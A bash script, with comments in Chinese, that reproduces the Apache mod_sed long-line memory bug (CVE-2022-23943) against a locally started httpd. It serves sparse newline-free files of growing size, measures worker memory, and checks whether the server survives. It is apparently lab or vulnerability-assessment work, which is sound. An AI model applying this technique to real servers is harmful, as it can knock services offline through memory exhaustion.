#!/bin/bash
# 诊断 CVE-2022-23943：mod_sed 超长单行的内存/行为评估（小规模）
# 用稀疏文件造“无换行”响应体，观察 mod_sed 的 linebuf 增长与峰值 RSS。
set -u
ROOT="/mnt/e/强网拟态/cve/apache"
RUN=/tmp/cve-2022-23943
DOC=/opt/httpd/htdocs
PREFIX=/opt/httpd
PORT=8095
BASE="http://127.0.0.1:$PORT"
rm -rf "$RUN"; mkdir -p "$RUN" "$DOC"
sed -e "s#Listen 8095#Listen $PORT#" -e "s#/tmp/cve-2022-23943#${RUN}#g" \
    "$ROOT/conf/CVE-2022-23943.conf" > "$RUN/sed.conf"
[ -f "$DOC/index.html" ] || echo '<html>lab</html>' > "$DOC/index.html"
cd "$PREFIX"
"$PREFIX/bin/httpd" -f "$RUN/sed.conf" -DFOREGROUND > "$RUN/console.log" 2>&1 &
HPID=$!
for i in $(seq 1 80); do
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 1 "$BASE/" 2>/dev/null || true)
  if [ -n "$code" ] && [ "$code" != "000" ]; then break; fi
  sleep 0.25
done
echo "master=$HPID"; echo "MemAvailable before: $(grep MemAvailable /proc/meminfo)"

for MB in 8 32 128; do
  SIZE=$((MB*1024*1024))
  truncate -s "$SIZE" "$DOC/bigline"
  echo "===== bigline ${MB}MB (${SIZE} bytes) ====="
  START=$(date +%s.%N)
  OUT=$(curl -sS --max-time 180 -o /dev/null -w 'http=%{http_code} size=%{size_download} time=%{time_total}' "$BASE/bigline" 2>&1)
  END=$(date +%s.%N)
  echo "$OUT (wall=$(echo "$END $START" | awk '{printf "%.2f", $1-$2}')s)"
  sleep 0.5
  for p in $(pgrep -P "$HPID"); do
    echo "  worker $p VmHWM=$(grep VmHWM /proc/$p/status 2>/dev/null | awk '{print $2}') kB  VmRSS=$(grep VmRSS /proc/$p/status 2>/dev/null | awk '{print $2}') kB"
  done
  echo "  MemAvailable now: $(grep MemAvailable /proc/meminfo)"
  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 3 "$BASE/" 2>/dev/null || true)
  echo "  server_after=$code"
  if [ "$code" = "000" ] || [ -z "$code" ]; then echo "  SERVER DOWN"; break; fi
done

echo "===== error_log ====="
tail -10 "$RUN/error_log"
kill "$HPID" 2>/dev/null; sleep 1; kill -9 "$HPID" 2>/dev/null
rm -f "$DOC/bigline" "$RUN/httpd.pid"
